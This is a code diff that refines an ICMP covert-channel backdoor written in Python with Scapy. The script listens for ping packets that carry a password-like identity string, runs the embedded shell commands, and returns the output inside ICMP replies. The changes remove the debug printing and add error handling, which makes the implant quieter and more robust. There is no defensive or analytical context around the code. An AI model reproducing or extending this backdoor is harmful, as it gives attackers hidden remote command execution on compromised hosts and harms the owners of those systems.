@@ -15,26 +15,27 @@ except Exception,e:
 
 def main():
 	#make an infinite loop on listening function
-	print "[+]entering inifinte loop..."
 	while 1:
-		#put code of listen here for simplicity
-		print "[+]listening..."
 		pkts = sniff(iface="eth0",timeout=10)
 		for packet in pkts:
 			if packet.haslayer(ICMP):
 				if str(packet.getlayer(ICMP).type) == "8":
-					command = packet.getlayer(Raw).load[0:]
+					try:
+						command = packet.getlayer(Raw).load[0:]
+					except Exception,e:
+						continue
 					identity = command[0:8].strip("\r").strip("\n")
-					print "Identity: " + identity
 					cmd = command[8:].strip("\r").strip("\n")
-					print "Acutal command: " + cmd
 					if identity == "nytcrwlr":
 						if cmd == "exit":
-                	                                print "[+]Exit block"
-                	                                sys.exit(0)
+							sys.exit(0)
 						else:
 							cmd = cmd.split(" ")
-							output = subprocess.check_output(cmd)
+							try:
+								output = subprocess.check_output(cmd)
+							except Exception,e:
+								output = str(e)
+								pass
 							dest = str(packet.getlayer(IP).src)
 							icmp = ICMP()
 							ip = IP()
@@ -42,9 +43,7 @@ def main():
 							icmp.code = 0
 							ip.dst = dest
 							data = output
-							print "[+]sending output and server sr1"
-							sr1(ip/icmp/data,timeout=1)
-							print "[+]done"
+							sr1(ip/icmp/data,timeout=1, verbose=False)
 
 if __name__ == "__main__":
 	main()
